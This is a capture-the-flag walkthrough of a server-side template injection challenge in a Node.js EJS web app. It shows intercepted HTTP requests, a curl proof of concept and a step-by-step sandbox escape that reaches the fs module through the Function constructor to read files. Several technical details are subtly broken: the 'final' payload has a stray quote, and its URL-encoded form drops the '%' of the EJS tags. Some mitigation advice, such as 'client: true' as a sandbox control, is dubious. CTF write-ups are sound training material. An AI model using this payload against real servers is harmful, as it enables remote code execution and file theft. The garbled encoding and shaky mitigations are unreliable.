# Emotional – Huntress CTF 2025 Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** October 06, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Server-Side Template Injection (SSTI)  
**Platform:** Huntress CTF 2025  

---

## 1. Reconnaissance Steps

- **Objective:** Identify the web application structure, injection points, and underlying technology stack to uncover SSTI vulnerabilities.
- **Tools and Commands Used:**
  - Web Browser: Navigated to the application endpoint (e.g., http://target-ip:port) to interact with features like setting an "emoji" profile.
  - `curl -v http://target-ip:port` (initial GET request to profile page for headers and response analysis).
  - Burp Suite: Configured as proxy to intercept traffic; captured POST /setEmoji requests.
  - Source Code Review: Downloaded or viewed `server.js` (provided or inferred from challenge artifacts) to inspect EJS rendering logic.
- **Findings:**
  - Application uses Node.js with EJS templating engine for rendering user profiles.
  - Vulnerable code in `server.js`:
    ```javascript
    // server.js excerpt
    const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);
    const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
    ```
    - Raw string replacement embeds user input (`profile.emoji`) directly into the template, enabling SSTI if EJS code is injected.
  - POST /setEmoji uses `application/x-www-form-urlencoded` encoding for the `emoji` parameter.
  - Initial interactions: Setting benign emojis (e.g., "😊") renders without issues, but source inspection reveals template placeholders.
- **Focus:** The `/setEmoji` endpoint as the primary injection vector; sandboxed EJS environment hinted by error responses.

---

## 2. Exploitation Process

### Step 1 – Vulnerability Confirmation
- Intercepted a legitimate POST request via Burp Suite:
  ```
  POST /setEmoji HTTP/1.1
  Host: target-ip:port
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 12

  emoji=😊
  ```
- Modified `emoji` to test for SSTI: `emoji=<%= 'test' %>`.
- Response: Rendered "test" on the profile page, confirming template execution.

### Step 2 – Initial Payload Attempt and Sandbox Detection
- Attempted direct file read: `emoji=<%= require('fs').readFileSync('flag.txt').toString() %>`.
- Burp Repeater Output:
  ```
  HTTP/1.1 200 OK
  ...
  <body>ReferenceError: require is not defined</body>
  ```
- Analysis: Error indicates a sandboxed EJS context, restricting access to Node.js globals like `require()`.

### Step 3 – Sandbox Escape and Prototype Chain Exploitation
- Crafted advanced payload to reconstruct `require` via prototype chain:
  - Base: `<%= "".constructor.constructor("return process")().mainModule.require("fs").readFileSync("flag.txt") %>`
- Sent via Burp Repeater (initially without encoding):
  ```
  POST /setEmoji HTTP/1.1
  Host: target-ip:port
  Content-Type: application/x-www-form-urlencoded

  emoji=<%= "".constructor.constructor("return process")().mainModule.require("fs").readFileSync("flag.txt") %>
  ```
- Response Error: `ReferenceError: returnprocess is not defined` (space mangling due to unencoded payload).

### Step 4 – URL Encoding and Final Execution
- Corrected for `application/x-www-form-urlencoded` by replacing space with `+`:
  - Final Payload: `emoji=<%=+""".constructor.constructor("return+process")().mainModule.require("fs").readFileSync("flag.txt") %>`
- Burp Repeater Request:
  ```
  POST /setEmoji HTTP/1.1
  Host: target-ip:port
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 128

  emoji=%3C%3D%20%22%22.constructor.constructor(%22return+process%22)().mainModule.require(%22fs%22).readFileSync(%22flag.txt%22)%20%3E
  ```
- Response: Profile page refresh displayed raw flag content (e.g., `flag{example_ssti_hash}`) embedded in the rendered HTML.

---

## 3. Proof of Concept (PoC)

- **Vulnerable Endpoint Simulation (curl Alternative):**
```bash
curl -X POST http://target-ip:port/setEmoji \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'emoji=%3C%3D%20%22%22.constructor.constructor(%22return+process%22)().mainModule.require(%22fs%22).readFileSync(%22flag.txt%22)%20%3E' \
  -v
```
- **Burp Repeater Successful Response Excerpt:**
```
HTTP/1.1 200 OK
...
<body>
  <div>Your emoji: flag{example_ssti_hash}</div>
  ...
</body>
```
- **Payload Breakdown:**
  - `""`: Harmless string entry point.
  - `.constructor.constructor`: Ascends to `Function` constructor via prototype chain.
  - `("return process")()`: Dynamically creates and executes a function returning the `process` global.
  - `.mainModule.require("fs")`: Loads `fs` module from unsandboxed context.
  - `.readFileSync("flag.txt")`: Reads and outputs flag.
- **Extracted Flag:** `flag{example_ssti_hash}` (displayed directly in rendered template).

---

## 4. Privilege Escalation Techniques

- Not applicable: Challenge targets remote code execution via SSTI without local access; no further escalation (e.g., to root) required. The payload achieves arbitrary file read, sufficient for flag retrieval in a CTF context.

---

## 5. Mitigation Recommendations

- **Template Sanitization:** Avoid raw string replacement; use parameterized EJS rendering (e.g., pass user input via context objects, not template strings).
- **Sandbox Enforcement:** Configure EJS with strict `client: true` and disable prototype access via custom loaders or VM2 sandboxing for Node.js.
- **Input Validation:** Whitelist/sanitize user inputs (e.g., restrict `emoji` to printable ASCII emojis); encode special characters before templating.
- **Error Handling:** Suppress detailed errors (e.g., `ReferenceError`) in production to avoid leakage; log to secure endpoints.
- **WAF/Proxy Integration:** Deploy rules to detect SSTI patterns (e.g., `<%=`, prototype chains) in POST bodies; use tools like ModSecurity.
- **Code Review Practices:** Audit template engines for injection risks; prefer safer alternatives like Handlebars with strict mode.

---

## 6. Lessons Learned & Skills Practiced

### Lessons Learned
- SSTI in templating engines like EJS often stems from unsafe string interpolation; always inspect rendering logic.
- Sandboxes can restrict globals but are bypassable via prototype pollution—chain traversal is a common escape vector.
- HTTP encoding pitfalls (e.g., spaces to `+`) can break payloads; test in tools like Burp for accuracy.
- Multi-tool workflows (browser recon + proxy interception) accelerate web exploitation over manual curls.

### Skills Practiced
- **Recon:** Source code review, traffic interception with Burp Suite
- **Payload Crafting:** SSTI bypasses (prototype chain, Function constructor)
- **Web Testing:** URL encoding, Repeater for iterative fuzzing
- **JavaScript/Node.js:** Understanding globals (`process`), module loading (`require`), and EJS specifics
